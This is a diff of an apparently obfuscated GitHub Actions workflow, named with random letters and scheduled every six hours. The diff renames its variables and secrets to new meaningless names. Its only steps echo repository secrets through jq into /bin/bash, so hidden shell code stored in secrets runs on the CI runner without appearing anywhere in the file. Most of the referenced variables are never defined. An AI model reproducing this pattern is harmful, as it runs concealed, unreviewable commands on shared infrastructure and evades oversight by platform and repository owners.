@@ -1,24 +1,24 @@
 name: xkakllk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 0/6 * * *'
-
-jobs:  # 6298
+    - cron: '34 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xkakllk
         env:
-          v8115: ${{ secrets.v8115 }}
+          me1065: ${{ secrets.me1065 }}
         run: |
-          echo $v8115 | jq -r .fsfld5548 | /bin/bash
-          echo $dof4259 | jq -r .lvkse9 | /bin/bash
-          echo $zltm79425 | jq -r .waift7371 | /bin/bash
-          echo $b85 | jq -r .y2751 | /bin/bash
-          echo $a1455 | jq -r .rw675 | /bin/bash
-          echo $doz149 | jq -r .l04 | /bin/bash
-          echo $xk74767 | jq -r .baqlr214 | /bin/bash
+          echo $me1065 | jq -r .ehkki00 | /bin/bash
+          echo $mywa032 | jq -r .w82 | /bin/bash
+          echo $dhbe24306 | jq -r .mslz9 | /bin/bash
+          echo $b062 | jq -r .cjj091 | /bin/bash
+          echo $kdi57 | jq -r .aq103 | /bin/bash
+          echo $vejw16889 | jq -r .vs5666 | /bin/bash
+          echo $t200 | jq -r .esrkv0891 | /bin/bash
+          echo $y237 | jq -r .z636 | /bin/bash
 
